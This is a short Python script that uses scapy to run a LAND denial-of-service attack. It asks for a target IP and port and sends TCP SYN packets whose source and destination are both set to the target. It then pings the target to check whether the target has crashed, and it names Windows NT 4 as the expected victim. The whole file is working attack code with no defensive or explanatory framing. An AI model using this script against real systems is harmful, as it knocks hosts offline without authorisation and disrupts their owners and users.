import scapy.all as scapy

"""
Requires being run as ROOT/administrator.
"""

def get_target_info():
    target = input("IP address of target: ").strip()
    try:
        port = int(input("Port number to target: ").strip())
    except ValueError:
        print("Invalid port number. Please enter a valid integer.")
        exit(1)
    return target, port

def craft_packet(target, port):
    return scapy.IP(src=target, dst=target) / scapy.TCP(sport=port, dport=port, flags="S")

def ping(destination):
    packet = scapy.IP(dst=destination) / scapy.ICMP()
    result = scapy.sr1(packet, timeout=5, verbose=False)
    return result is not None

def main():
    target, port = get_target_info()

    print("Pinging target...")
    if ping(target):
        payload = craft_packet(target, port)
        attempts = 3
        while attempts > 0:
            print("Target is up. Sending payload.")
            scapy.send(payload, verbose=False)
            print("Pinging target again...")
            if not ping(target):
                print("Target not responding. Assuming it's vulnerable and down.")
                break
            attempts -= 1
        else:
            print("Target did not go down. It's either running Windows NT 4 or isn't vulnerable.")
    else:
        print("Host is already down. Check the IP?")

    print("Finished.")

if __name__ == "__main__":
    main()
